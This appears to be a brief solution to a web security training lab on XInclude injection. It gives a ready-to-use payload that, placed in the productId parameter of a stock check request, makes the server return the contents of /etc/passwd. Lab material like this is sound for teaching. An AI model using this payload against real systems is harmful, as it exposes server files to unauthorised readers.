# Lab: Exploiting XInclude to retrieve files

Intercept a check stock request and change the productId parameter to `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

Forward the request to return the target data, solving the lab.